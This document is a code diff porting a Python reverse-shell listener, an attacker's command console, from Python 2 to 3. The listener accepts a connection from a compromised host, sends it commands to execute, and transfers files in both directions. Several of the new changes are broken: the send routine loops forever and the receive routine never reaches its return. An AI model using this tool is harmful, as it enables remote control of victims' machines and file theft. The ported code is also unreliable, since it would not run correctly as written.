@@ -1,8 +1,7 @@
-#!/usr/bin/env python2.7
 import socket, json, base64
 
 
-IP = "0.0.0.0" # change this
+IP = "0.0.0.0".encode(("utf-8")) # change this
 PORT = 4445 # change this (Integer Only)
 
 
@@ -14,20 +13,25 @@ class Listener:
         listener.listen(0)
         print ("[*] Listening for incoming connections")
         self.connection, self.address = listener.accept()
-        print("[+] Connection Established at [ %s ]" % str(self.address))
+        print(("[+] Connection Established at [ %s ]" % str(self.address)))
 
     def json_send(self, data):
-        json_data = json.dumps(data)
-        self.connection.send(json_data)
-
+        json_data = json.dumps(data).encode('utf-8')
+        while True:
+            try:
+                self.connection.send(json_data)
+            except ValueError:
+                continue
     def json_recv(self):
         json_data = ""
         while True:
             try:
-                json_data += self.connection.recv(1024)
-                return json.loads(json_data)
+                
+                json_data += self.connection.recv(1024).decode('utf-8')
+                #return json.loads(json_data)
             except ValueError:
                 continue
+        return json.loads(json_data)
 
     def execute_remotely(self, command):
         self.json_send(command)
@@ -35,13 +39,11 @@ class Listener:
             self.connection.close()
             exit()
         return self.json_recv()
-
     def write_file(self, path, content):
         with open(path, "wb") as file:
             decoded_file = base64.b64decode(content)
             file.write(decoded_file)
             return "Downloaded [%s] Successfully ." % path
-
     def read_file(self, path):
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
@@ -49,7 +51,7 @@ class Listener:
 
     def run(self):
         while True:
-            cmd = raw_input("> ")
+            cmd = input("> ")
             cmd = cmd.split(" ")
             try:
                 if cmd[0] == "upload":
@@ -58,8 +60,8 @@ class Listener:
                 result = self.execute_remotely(cmd)
                 if cmd[0] == "download" and "[-] Error " not in result:
                     result = self.write_file(cmd[1], result)
-            except Exception:
-                result = "[-] Error during command execution."
+            except Exception as e:
+                result = "[-] Error during command execution. \n %s" %(e)
             print (result)
 
 
